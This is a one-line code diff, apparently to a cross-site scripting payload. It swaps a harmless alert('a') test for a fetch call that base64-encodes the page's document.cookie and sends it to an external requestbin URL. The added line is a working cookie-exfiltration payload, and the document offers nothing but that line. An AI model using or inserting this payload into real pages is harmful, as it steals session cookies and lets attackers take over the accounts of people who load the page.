@@ -1,1 +1,1 @@
-alert('a');
+fetch('https://requestbin.fullcontact.com/ph3ig1ph?D='+  btoa(document.cookie));
